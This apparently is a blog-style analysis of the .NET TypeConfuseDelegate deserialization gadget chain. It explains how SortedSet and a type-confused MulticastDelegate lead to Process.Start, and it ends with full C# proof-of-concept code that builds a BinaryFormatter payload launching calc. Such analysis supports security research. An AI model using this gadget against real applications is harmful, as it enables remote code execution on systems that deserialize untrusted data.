# Introduction
`TypeConfuseDelegate` is a gadget chain take advantage of `SortedSet` class calls the **comparator** class to sort while deserializing, which is an input that attacker can controls and **multicast delegate** can modify the characteristics of delegate instance to trigger code execution during deserialization process.

In this blog, we will have 2 main sections:
- First is about `SortedSet` class and how it can be used as a gadget chain
- Second is about how `MulticastDelegate` is used to help trigger code execution and why this gadget is named `TypeConfuseDelegate`

## 1. About SortedSet class

In its simplest form, `SortedSet` take a comparator as an input, and then you call `Add` to add elements that you want to compare to sort

```c#
// Create a sorted set using the ByFileExtension comparer.
var set = new SortedSet<string>(new ByFileExtension());
set.Add("hello.a");
set.Add("hello.b");
```
In the code above, `ByFileExtension` is a comparator which is inherited from `IComparer<T>` interface

In this interface, it defines a method `int Compare(T x, T y)` . This method is used to compare 2 objects that have the same Type.

When we call `Add(T x)` for the first time, the comparator won't be called, **only after the second call to `Add(T x)`, the comparator will be called** ( gotta need something to compare with right ? :D )

### Comparer class and ComparisonComparer type
`Compaerer<T>` implements `ICompare<T>` interface, in this class, we will focus on `Comparer.Create()` function because that is we want to create a comparator as an input for `SortedSet` class

Comparer<T> source code:

`Comparer.Create()` returns a `ComparisonComparer<T>` type

As you can see, `ComparisonComparer<T>` implements `Serializable` attribute and it inherited from `Comparer<T>` class, so in here we have a class that:
 - Can be serialized
 - Is a comparator, which can be used as an input for `SortedSet` object
 
Please take note of this class as it will become very important for our gadget chain.
 
We will focus on the function that it uses to compare:
 ```c#
 public override int Compare(T x, T y)
 {
    return this._comparison(x,y);
 }

 ```
Where `this._comparison` has a type `Compasion<T>`  and the type is passed in at initilization time. Let's take a deeper look at `Comparison<T>` type
```c#
 public delegate int Comparison<in T>(T x, T y);
```
Its function signature is the same as `Comparison` function and method in `IComparer<T>` interface.

### Sortedset OnDeserialization callback

![image](https://user-images.githubusercontent.com/37280106/179709064-a3acea30-dac4-481d-9d99-ef7d52250f16.png)
 
`IDeserializationCallback` interface defined `OnDeserialization` method which is automatically called during deserialization process, it's like **magic method** 

In `SortedSet.OnDeserialization()` implementation, we can see:
- It extracts a type named `Comparer` with the type `IComparer<T>`
- It extracts our input when we call `Add(input)` in `GetValues("Items")` 

So during deserialization process, when `SortedSet<T>` trigger sort, it will call the **comparison function in the comparator** after we call `Add` more than 2 times.

**Idea to craft RCE payload**:

Because we can control the comparison function input, we can also control the elements that we want to `Add()`. If we can set the comparison function to `Process.Start()` . We can achieve code execution

```c#
public static Process Start(string fileName, string arguments)
{
	 return Process.Start(new ProcessStartInfo(fileName, arguments));
}
```

`Process.Start()` function return `Process` type, if we replace comparison function with `Process.Start()` function, it will throw error and cause serialization failure

So how do we overcome this problem ?. Turn out, we can replace the calling function with a `MulticastDelegate`. 

## 2. About MulticastDelegate to TypeConfuseDelegate gadget chain

Here is the code that use `MulticastDelegate` as an input for `SortedSet` class.
![image](https://user-images.githubusercontent.com/37280106/179892243-da3b0f0f-fef3-4dde-8446-8d3273211d2f.png)


Let's break it down to see what's the magic behind all this:

`MulticastDelegate` is a multicast delegation, there are 2 type of **delegates** in C#: Single and Multicast

In here, we call `MulticastDelegate.Combine()` , **it will merge all the delegates with the same type into 1 delegate instance** ( see more [here](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/how-to-combine-delegates-multicast-delegates)). **When the multicast delegate is called, it invokes the delegates in the list, in order.**

`MulticastDelegate.Combine()` will call `MulticastDelegate.CombineImpl()` internally, the function implementation is lengthy but we just need to pay attention on a few things
```c#
		protected sealed override Delegate CombineImpl(Delegate follow)
		{
			if (follow == null)
			{
				return this;
			}
			if (!Delegate.InternalEqualTypes(this, follow))
			{
				throw new ArgumentException(Environment.GetResourceString("Arg_DlgtTypeMis"));
			}
			MulticastDelegate multicastDelegate = (MulticastDelegate)follow;
			int num = 1;
			object[] array = multicastDelegate._invocationList as object[];
			if (array != null)
			{
				num = (int)multicastDelegate._invocationCount;
			}
			object[] array2 = this._invocationList as object[];
			int num2;
			object[] array3;
			......
```
There are 2 important fields: `_invocationList` and `_invocationCount`
- `_invocationCount`: is the length of `_invocationList` array
- `_invocationList`: is the array that holds all the delegate instances that need to be combined/merged

This function create a new array by extracting delegate instances from `_invocationList`
```c#
object[] array = multicastDelegate._invocationList as object[]
```
and then the function return new MulticastDelegate variable.

Looking at the code that I showed above, we are combining 2 Comparison objects with delegate type, and then we pass it to the `TypeConfuseDelegate` function where we will modify the content of `_invocationList`.
```
Delegate d = new Comparison<string>(String.Compare);
Comparison<string> c = (Comparison<string>)MulticastDelegate.Combine(d, d);

TypeConfuseDelegate(c);

```
In `TypeConfuseDelegate` function, by using `System.Reflection` , we extract the field `_invocationList` from `MulticastDelegate` and replace it with a delegate instance `new Func<string, string, Process>(Process.Start)` which is also a `object` type, so `MulticastDelegate` won't complain about types mismatched.
```c#
object[] invoke_list = comp.GetInvocationList();
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(comp, invoke_list);
```

I will place a breakpoint during the code execution to show you before and after we modify the `_invocationList` element

Before:

As you can see, our combined delegate instance `c` has 2 elements in `_invocationList` array, they are both `Comparison` objects because we called `Combine(d,d)`

After:

And then when we  call `Add()` to add 2 string objects to trigger `compare` function
```c#
 SortedSet<string> set = new SortedSet<string>(comp);
 set.Add("calc");
 set.Add("adummy");
```

Where `this.comparer` is `ComparisonComparer` object that we passed to `SortedSet` class, after calling `this.Add(array[i])`, it will call `this.comparer.compare(x,y)`  which will lead us to:
![image](https://user-images.githubusercontent.com/37280106/179897259-c3dca9b0-d181-4b15-8ff1-854e4d92264a.png)

Now, remember what I said earlier: **The multicast delegate contains a list of the assigned delegates (`_invocationList`). When the multicast delegate is called, it invokes the delegates in the list, in order.**

Our `ComparisonComparer` is a `MulticastDelegate` with `_invocationList` contains our `Process.Start()` function that we modified earlier. During the function execution, it will eventually leads us to our final sink:

### Full code:
```c#
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

namespace DeserialzationGadgetAnalysis
{
    public class Program
    {
        static void TypeConfuseDelegate(Comparison<string> comp)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = comp.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(comp, invoke_list);
        }

        static void Main(string[] args)
        {

    
            Delegate d = new Comparison<string>(String.Compare);
            Comparison<string> c = (Comparison<string>)MulticastDelegate.Combine(d, d);
    
            IComparer<string> comp = Comparer<string>.Create(c);

            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("calc");
            set.Add("adummy");

            TypeConfuseDelegate(c);

            BinaryFormatter bf = new BinaryFormatter();
            BinaryFormatter bf2 = new BinaryFormatter();
            MemoryStream ms = new MemoryStream();
            bf.Serialize(ms, set);
            ms.Position = 0;

            bf2.Deserialize(ms);

        }
    }
}

```
